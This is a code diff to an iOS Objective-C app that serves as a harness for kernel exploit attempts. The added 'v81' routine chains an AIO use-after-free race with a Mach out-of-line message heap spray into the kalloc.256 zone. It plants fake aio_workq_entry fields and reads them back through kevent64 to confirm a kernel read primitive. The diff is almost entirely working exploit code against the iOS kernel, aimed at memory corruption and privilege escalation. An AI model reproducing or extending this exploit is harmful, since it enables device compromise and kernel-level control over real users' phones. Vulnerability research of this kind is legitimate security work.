@@ -211,6 +211,7 @@ static const char kOpenPropertiesGarbage[] =
 @property (nonatomic, strong) UIButton   *lifecycleButton;
 @property (nonatomic, strong) UIButton   *aioUafButton;
 @property (nonatomic, strong) UIButton   *v79Button;
+@property (nonatomic, strong) UIButton   *v81Button;
 @property (nonatomic, strong) UIButton   *pfRouteProbeButton;
 @property (nonatomic, assign) int         pfRoutePhase;
 @property (nonatomic, strong) UIButton   *iohidUAFButton;
@@ -750,6 +751,15 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self.v79Button addTarget:self action:@selector(aioUafV79Tapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.v79Button];
 
+    self.v81Button = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.v81Button.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *v81Conf = [UIButtonConfiguration filledButtonConfiguration];
+    v81Conf.baseBackgroundColor = [UIColor colorWithRed:0.8 green:0.2 blue:0.0 alpha:1.0];
+    self.v81Button.configuration = v81Conf;
+    [self.v81Button setTitle:@"AIO v81 (OOL spray)" forState:UIControlStateNormal];
+    [self.v81Button addTarget:self action:@selector(aioUafV81Tapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.v81Button];
+
     self.pfRouteProbeButton = [UIButton buttonWithType:UIButtonTypeSystem];
     self.pfRouteProbeButton.translatesAutoresizingMaskIntoConstraints = NO;
     UIButtonConfiguration *pfConf = [UIButtonConfiguration filledButtonConfiguration];
@@ -815,7 +825,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self.v79Button.topAnchor constraintEqualToAnchor:self.aioUafButton.bottomAnchor constant:12],
         [self.v79Button.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.v79Button.widthAnchor constraintGreaterThanOrEqualToConstant:220],
-        [self.pfRouteProbeButton.topAnchor constraintEqualToAnchor:self.v79Button.bottomAnchor constant:12],
+        [self.v81Button.topAnchor constraintEqualToAnchor:self.v79Button.bottomAnchor constant:12],
+        [self.v81Button.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.v81Button.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.pfRouteProbeButton.topAnchor constraintEqualToAnchor:self.v81Button.bottomAnchor constant:12],
         [self.pfRouteProbeButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.pfRouteProbeButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
         [self.iohidUAFButton.topAnchor constraintEqualToAnchor:self.pfRouteProbeButton.bottomAnchor constant:12],
@@ -6855,6 +6868,230 @@ cleanup:
         dispatch_async(dispatch_get_main_queue(), ^{
             self.v79Button.enabled = YES;
             [self.v79Button setTitle:@"AIO v79 (REF exact)" forState:UIControlStateNormal];
+        });
+        }  // @autoreleasepool
+    });
+}
+
+// =======================================================================
+// v81: OOL spray type confusion — free reclaim entries, fill slots with
+// controlled OOL data, kevent64 reads OOL payload. If ext[] shows our
+// fingerprint → kernel read confirmed. If FAR=0x58 → spray works (procp=0).
+// =======================================================================
+
+#define V81_OOL_COUNT 128
+#define V81_OOL_SIZE  256   // kalloc.256 — same zone as aio_workq_entry
+
+- (void)aioUafV81Tapped {
+    static volatile int32_t _v81Running = 0;
+    if (!__sync_bool_compare_and_swap(&_v81Running, 0, 1)) {
+        [self appendLog:@"v81 already running"]; return;
+    }
+    @synchronized([ViewController class]) {
+        static int64_t _v81Last = 0;
+        int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
+        if (now - _v81Last < 3000) { _v81Running = 0; [self appendLog:@"Debounced"]; return; }
+        _v81Last = now;
+    }
+
+    [self appendLog:@"\n========== AIO UAF v81 (OOL Spray Type Confusion) =========="];
+    [self appendLog:[NSString stringWithFormat:@"v79 trigger + %d x %d-byte OOL spray", V81_OOL_COUNT, V81_OOL_SIZE]];
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+        self.v81Button.enabled = NO;
+        [self.v81Button setTitle:@"Running..." forState:UIControlStateNormal];
+    });
+
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+        aio_set_thread_affinity(42);
+
+        // Build OOL payload — fingerprint at returnval/errorval offsets
+        uint8_t oolPayload[V81_OOL_SIZE];
+        memset(oolPayload, 0, V81_OOL_SIZE);
+        // aio_workq_entry offsets:
+        // +0x20: returnval → ext[1]
+        // +0x28: errorval  → ext[0]
+        // +0x40: procp     → must be valid or crash
+        // +0x10: aio_proc_link.tqe_next → TAILQ_REMOVE write value
+        // +0x18: aio_proc_link.tqe_prev → TAILQ_REMOVE write target
+        *(uint64_t *)(oolPayload + 0x20) = 0xCAFE0000DEAD0001ULL;  // ext[1] fingerprint
+        *(uint32_t *)(oolPayload + 0x28) = 0xBEEF0002;             // ext[0] fingerprint
+        // procp at +0x40 stays 0 → WILL crash at FAR=0x58 if spray lands
+
+        // Create OOL spray port
+        mach_port_t sprayPort;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayPort);
+
+        // Prepare OOL message template
+        typedef struct {
+            mach_msg_header_t header;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+        } OolMsg;
+        OolMsg tmpl;
+        memset(&tmpl, 0, sizeof(tmpl));
+        tmpl.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+        tmpl.header.msgh_size = sizeof(tmpl);
+        tmpl.header.msgh_remote_port = sprayPort;
+        tmpl.header.msgh_id = 0xE100;
+        tmpl.body.msgh_descriptor_count = 1;
+        tmpl.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+        tmpl.ool.address = oolPayload;
+        tmpl.ool.size = V81_OOL_SIZE;
+        tmpl.ool.deallocate = FALSE;
+        tmpl.ool.copy = MACH_MSG_PHYSICAL_COPY;
+
+        // ---- Phase A: v79 race (proven) ----
+        NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v81.bin"];
+        int fd = open(path.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
+        if (fd < 0) {
+            [self appendLog:@"FAIL: open failed"];
+            mach_port_destroy(mach_task_self(), sprayPort);
+            _v81Running = 0;
+            dispatch_async(dispatch_get_main_queue(), ^{
+                self.v81Button.enabled = YES;
+                [self.v81Button setTitle:@"AIO v81 (OOL spray)" forState:UIControlStateNormal];
+            });
+            return;
+        }
+        char fdata[4096];
+        memset(fdata, 'A', sizeof(fdata));
+        write(fd, fdata, sizeof(fdata));
+        [self appendLog:[NSString stringWithFormat:@"fd=%d pid=%d uid=%d", fd, getpid(), getuid()]];
+
+        bool won = false;
+        for (int attempt = 0; attempt < 10; attempt++) {
+            [self appendLog:[NSString stringWithFormat:@"  attempt %d/10", attempt + 1]];
+
+            int kq = kqueue();
+            if (kq < 0) { [self appendLog:@"  kqueue failed"]; continue; }
+
+            static struct aiocb tcb;
+            static char tbuf[4096];
+            memset(&tcb, 0, sizeof(tcb));
+            tcb.aio_fildes = fd;
+            tcb.aio_buf = tbuf;
+            tcb.aio_nbytes = sizeof(tbuf);
+            tcb.aio_offset = 0;
+            tcb.aio_lio_opcode = LIO_READ;
+            tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
+            tcb.aio_sigevent.sigev_signo = kq;
+            tcb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAA;
+
+            static struct aiocb rcbs[V79_NRECLAIM];
+            static char rbufs[V79_NRECLAIM][4096];
+            for (int i = 0; i < V79_NRECLAIM; i++) {
+                memset(&rcbs[i], 0, sizeof(rcbs[i]));
+                rcbs[i].aio_fildes = fd;
+                rcbs[i].aio_buf = rbufs[i];
+                rcbs[i].aio_nbytes = sizeof(rbufs[i]);
+                rcbs[i].aio_offset = 0;
+                rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+            }
+
+            struct v79_race_state rs = {};
+            rs.trigger = &tcb;
+            rs.rcbs = rcbs;
+            rs.nrcbs = V79_NRECLAIM;
+
+            pthread_t thr;
+            pthread_create(&thr, NULL, v79_racer, &rs);
+            atomic_store_explicit(&rs.start, true, memory_order_release);
+
+            struct aiocb *ptr = &tcb;
+            struct sigevent sig = {};
+            sig.sigev_notify = SIGEV_NONE;
+            lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
+
+            usleep(500);
+            atomic_store_explicit(&rs.stop, true, memory_order_release);
+            pthread_join(thr, NULL);
+
+            int freed = atomic_load(&rs.freed);
+            bool reclaimed = atomic_load(&rs.reclaim_done);
+            [self appendLog:[NSString stringWithFormat:@"  freed=%d reclaimed=%d", freed, reclaimed]];
+
+            if (freed == 0) {
+                while (aio_error(&tcb) == EINPROGRESS) usleep(500);
+                aio_return(&tcb);
+                close(kq);
+                [self appendLog:@"  race lost, retry"];
+                continue;
+            }
+            if (!reclaimed) {
+                close(kq);
+                [self appendLog:@"  freed but no reclaim, retry"];
+                continue;
+            }
+
+            // Wait for reclaim entries to complete
+            for (int i = 0; i < V79_NRECLAIM; i++)
+                while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
+
+            // ---- v81 STEP: Free ALL reclaim entries ----
+            [self appendLog:@"  freeing reclaim entries..."];
+            for (int i = 0; i < V79_NRECLAIM; i++)
+                aio_return(&rcbs[i]);
+
+            // ---- v81 STEP: Spray OOL to fill freed slots ----
+            [self appendLog:[NSString stringWithFormat:@"  spraying %d OOL messages...", V81_OOL_COUNT]];
+            for (int i = 0; i < V81_OOL_COUNT; i++) {
+                tmpl.header.msgh_id = 0xE100 + i;
+                if (mach_msg(&tmpl.header, MACH_SEND_MSG, sizeof(tmpl), 0,
+                             MACH_PORT_NULL, 0, MACH_PORT_NULL) != MACH_MSG_SUCCESS) {
+                    [self appendLog:[NSString stringWithFormat:@"  OOL spray failed at %d/128", i]];
+                    break;
+                }
+            }
+
+            // ---- v81 STEP: kevent64 — reads from OOL-filled slot ----
+            [self appendLog:@"  kevent64 — reading from spray-filled slot..."];
+            struct kevent64_s kev = {};
+            struct timespec ts = {10, 0};
+            int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
+
+            if (nev > 0) {
+                [self appendLog:@"  *** TYPE CONFUSION CHECK ***"];
+                [self appendLog:[NSString stringWithFormat:@"  ident=0x%llx data=0x%llx udata=0x%llx",
+                    kev.ident, kev.data, kev.udata]];
+                [self appendLog:[NSString stringWithFormat:@"  ext[0]=0x%llx (expected 0xBEEF0002 if OOL hit)", kev.ext[0]]];
+                [self appendLog:[NSString stringWithFormat:@"  ext[1]=0x%llx (expected 0xCAFE0000DEAD0001 if OOL hit)", kev.ext[1]]];
+
+                if (kev.ext[0] == 0xBEEF0002 || kev.ext[1] == 0xCAFE0000DEAD0001ULL) {
+                    [self appendLog:@"  *** OOL TYPE CONFUSION CONFIRMED — kernel read primitive! ***"];
+                } else if (kev.ext[1] == 0x1000) {
+                    [self appendLog:@"  ext[1]=0x1000 — spray missed, still reading reclaim entry data"];
+                } else {
+                    [self appendLog:@"  unexpected ext values — partial type confusion?"];
+                }
+
+                close(kq);
+                won = true;
+                break;
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"  kevent64 returned %d (likely crashed)", nev]];
+                close(kq);
+            }
+        }
+
+        // Drain OOL messages from port
+        mach_msg_header_t drain;
+        while (mach_msg(&drain, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
+                        sizeof(drain), sprayPort, 10, MACH_PORT_NULL) == MACH_MSG_SUCCESS);
+        mach_port_destroy(mach_task_self(), sprayPort);
+
+        close(fd);
+        unlink(path.UTF8String);
+
+        [self appendLog:[NSString stringWithFormat:@"\nv81: %@", won ? @"DOUBLE-FREE preserved" : @"FAILED"]];
+        [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
+        [self appendLog:@"========== AIO UAF v81 Complete =========="];
+
+        _v81Running = 0;
+        dispatch_async(dispatch_get_main_queue(), ^{
+            self.v81Button.enabled = YES;
+            [self.v81Button setTitle:@"AIO v81 (OOL spray)" forState:UIControlStateNormal];
         });
         }  // @autoreleasepool
     });
